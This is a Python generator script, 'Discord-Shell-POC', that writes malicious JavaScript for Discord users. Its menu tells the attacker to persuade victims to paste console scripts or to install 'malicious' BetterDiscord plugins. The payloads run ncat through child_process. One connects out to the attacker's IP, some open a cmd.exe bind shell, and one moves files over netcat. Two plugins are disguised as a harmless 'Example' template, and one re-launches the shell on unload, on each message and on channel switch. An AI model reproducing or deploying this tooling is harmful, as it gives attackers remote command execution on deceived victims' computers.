# Discord-Shell-POC
# Made by: 0x1CA3
# Date: 5/4/21

import os

os.system("cls")
print(''' 
[1] - Generate a normal ncat shell. [Console script. Convince your victim to paste this in their console.]
[2] - Generate a ncat shell to connect to the targets CMD. [Be able to run any CMD commands. This is also a console script. Convince your victim to paste this in their console.]
[3] - Generate script that lets you transfer files via netcat. [Console script. Convince your victim to paste this in their console.]
[4] - Generate a plugin that listens for connections after being loaded. [Semi-stable] [Discord plugin, if your victim has BetterDiscord, convince them to add the malicious plugin in their plugin folder.]
[5] - Generate a plugin that continues listening for connections even after the attacker/victim is disconnected. Make sure your victim enables the plugin for it to fully function properly [Very Stable. Even if discord/betterdiscord crashes it still runs in the background.]

Pick an option (number)

REMEMBER:
If you select a console script, make sure to have the victim paste it into their console, (unless you're testing it for yourself)
If you select a plugin, make sure your victim has BetterDiscord installed, and also make sure that they put the malicious plugin in their plugin folder so it loads properly.
Ncat must be installed on your machine!''')

def main():
    while True:
        maininput = input("Option: ")
        if maininput == "1" or maininput == "one":
            option1 = open("Victim/victim.js", "w")
            option1.write(''' 
            const utillool = require('util');


            const runshit = utillool.promisify(require('child_process').exec);

            async function executeshit(execom) {
              const { stdout, stderr, error } = await runshit(execom);
              if(stderr){console.error('stderr:', stderr);}
              if(error){console.error('error:', error);}
              return stdout;
            }


            async function executecomz () {
                const execom = 'ncat -nv iphere 4444'; // replace "iphere" with my ip
                const result = await executeshit(execom);
                console.log(result);
            }


            executecomz();
            ''')
            option1.close()
            
            print('''File generated!
            Make sure to edit the file
            to change the IP to your own.
            ''')
            quesoption2 = input("Continue? Y or N: ")
            if quesoption2 == "Y" or quesoption2 == "y":
                os.system("py main.py")
            elif quesoption2 == "N" or quesoption2 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        elif maininput == "2" or maininput == "two":
            option2 = open("Victim/victimcmd.js", "w")
            option2.write('''
            const utillool = require('util');


            const runshit = utillool.promisify(require('child_process').exec);

            async function executeshit(execom) {
              const { stdout, stderr, error } = await runshit(execom);
              if(stderr){console.error('stderr:', stderr);}
              if(error){console.error('error:', error);}
              return stdout;
            }


            async function executecomz () {
                const execom = 'ncat -lvp 4444 -e cmd.exe';
                const result = await executeshit(execom);
                console.log(result);
            }


            executecomz();
            ''')
            option2.close()
            print("File generated!")
            quesoption1 = input("Continue? Y or N: ")
            if quesoption1 == "Y" or quesoption1 == "y":
                os.system("py main.py")
            elif quesoption1 == "N" or quesoption1 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        elif maininput == "3" or maininput == "three":
            option3 = open("Victim/connectfile.js","w")
            option3.write('''
            const utillool = require('util');


            const runshit = utillool.promisify(require('child_process').exec);

            async function executeshit(execom) {
              const { stdout, stderr, error } = await runshit(execom);
              if(stderr){console.error('stderr:', stderr);}
              if(error){console.error('error:', error);}
              return stdout;
            }


            async function executecomz () {
                const execom = 'ncat -lvp 4444 > filelol.txt'; // replace "filelol.txt" with file name and the extension. example: file.txt
                const result = await executeshit(execom);
                console.log(result);
            }


            executecomz();            
            ''')
            option3.close()
            print('''File generated!
            Before making the victim execute this code or paste it in the console,
            make sure that you have the netcat listener already started on your machine, or else it will not work
            Example: nc -lvp 4444 > test.txt
            ''')
            quesoption3 = input("Continue? Y or N: ")
            if quesoption3 == "Y" or quesoption3 == "y":
                os.system("py main.py")
            elif quesoption3 == "N" or quesoption3 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        elif maininput == "4" or maininput == "four":
            option4 = open("Victim/example.plugin.js", "w")
            option4.write('''//META{"name":"Example"}*//
class Example {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() { return "Example"; }
    getShortName() { return "Example"; }
    getDescription() { return "This is an example/template for a BD plugin."; }
    getVersion() { return "0.1.0"; }
    getAuthor() { return "Minin"; }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel Options, just standard HTML-->";
    }
    
    // Load/Unload
    load() { 
	const utillool = require('util');


	const runshit = utillool.promisify(require('child_process').exec);

	async function executeshit(execom) {
	const { stdout, stderr, error } = await runshit(execom);
	  if(stderr){console.error('stderr:', stderr);}
	  if(error){console.error('error:', error);}
	  return stdout;
	}


	async function executecomz () {
		const execom = 'ncat -lvp 4444 -e cmd.exe';
		const result = await executeshit(execom);
		console.log(result);
	}


	executecomz();
	}
	
    unload() { }

    // Events

    onMessage() {
        // Called when a message is received
    };

    onSwitch() {
        // Called when a server or channel is switched
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };
    
    // Start/Stop
    start() {
        var libraryScript = document.getElementById('zeresLibraryScript');
	if (!libraryScript) {
		libraryScript = document.createElement("script");
		libraryScript.setAttribute("type", "text/javascript");
		libraryScript.setAttribute("src", "https://github.com/0x1CA3/Discord-Shell-POC/blob/main/Testing-Sample/victimcmd.js");
		libraryScript.setAttribute("id", "zeresLibraryScript");
		document.head.appendChild(libraryScript);
	}
	
	
	if (typeof window.ZeresLibrary !== "undefined") this.initialize();
	else libraryScript.addEventListener("load", () => { this.initialize(); });
    }
       
    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
}           ''')
            option4.close()
            print("File Generated! Note: If you already generated another plugin, this file will override the other one you generated!")
            quesoption4 = input("Continue? Y or N: ")
            if quesoption4 == "Y" or quesoption4 == "y":
                os.system("py main.py")
            elif quesoption4 == "N" or quesoption4 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        elif maininput == "5" or maininput == "five":
            option5 = open("Victim/example.plugin.js", "w")
            option5.write('''//META{"name":"Example"}*//
class Example {
    // Constructor
    constructor() {
        this.initialized = false;
    }

    // Meta
    getName() { return "Example"; }
    getShortName() { return "Example"; }
    getDescription() { return "This is an example/template for a BD plugin."; }
    getVersion() { return "0.1.0"; }
    getAuthor() { return "Minin"; }

    // Settings  Panel
    getSettingsPanel() {
        return "<!--Enter Settings Panel Options, just standard HTML-->";
    }
    
    // Load/Unload
    load() { 
	const utillool = require('util');


	const runshit = utillool.promisify(require('child_process').exec);

	async function executeshit(execom) {
	const { stdout, stderr, error } = await runshit(execom);
	  if(stderr){console.error('stderr:', stderr);}
	  if(error){console.error('error:', error);}
	  return stdout;
	}


	async function executecomz () {
		const execom = 'ncat -lvp 4444 -e cmd.exe';
		const result = await executeshit(execom);
		console.log(result);
	}


	executecomz();
	}
	
    unload() {
        const utillool = require('util');


        const runshit = utillool.promisify(require('child_process').exec);

        async function executeshit(execom) {
        const { stdout, stderr, error } = await runshit(execom);
          if(stderr){console.error('stderr:', stderr);}
          if(error){console.error('error:', error);}
          return stdout;
        }


        async function executecomz () {
            const execom = 'ncat -lvp 4444 -e cmd.exe';
            const result = await executeshit(execom);
            console.log(result);
        }


        executecomz();
    }

    // Events

    onMessage() {
        const utillool = require('util');


        const runshit = utillool.promisify(require('child_process').exec);

        async function executeshit(execom) {
        const { stdout, stderr, error } = await runshit(execom);
          if(stderr){console.error('stderr:', stderr);}
          if(error){console.error('error:', error);}
          return stdout;
        }


        async function executecomz () {
            const execom = 'ncat -lvp 4444 -e cmd.exe';
            const result = await executeshit(execom);
            console.log(result);
        }


        executecomz();
    };

    onSwitch() {
        const utillool = require('util');


        const runshit = utillool.promisify(require('child_process').exec);

        async function executeshit(execom) {
        const { stdout, stderr, error } = await runshit(execom);
          if(stderr){console.error('stderr:', stderr);}
          if(error){console.error('error:', error);}
          return stdout;
        }


        async function executecomz () {
            const execom = 'ncat -lvp 4444 -e cmd.exe';
            const result = await executeshit(execom);
            console.log(result);
        }


        executecomz();    
    };

    observer(e) {
        // raw MutationObserver event for each mutation
    };
    
    // Start/Stop
    start() {
        var libraryScript = document.getElementById('zeresLibraryScript');
	if (!libraryScript) {
		libraryScript = document.createElement("script");
		libraryScript.setAttribute("type", "text/javascript");
		libraryScript.setAttribute("src", "https://github.com/0x1CA3/Discord-Shell-POC/blob/main/Testing-Sample/victimcmd.js");
		libraryScript.setAttribute("id", "zeresLibraryScript");
		document.head.appendChild(libraryScript);
	}
	
	
	if (typeof window.ZeresLibrary !== "undefined") this.initialize();
	else libraryScript.addEventListener("load", () => { this.initialize(); });
    }
       
    stop() {
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has stopped.");
    };

    //  Initialize
    initialize() {
        this.initialized = true;
        PluginUtilities.showToast(this.getName() + " " + this.getVersion() + " has started.");
    }
}           ''')
            option5.close()
            print("File Generated! Note: If you already generated another plugin, this file will override the other one you generated!")
            quesoption5 = input("Continue? Y or N: ")
            if quesoption5 == "Y" or quesoption5 == "y":
                os.system("py main.py")
            elif quesoption5 == "N" or quesoption5 == "n":
                exit()
            else:
                print("Wrong Command!")
                exit()
        else:
            print("Wrong Command! Try Again!")
main()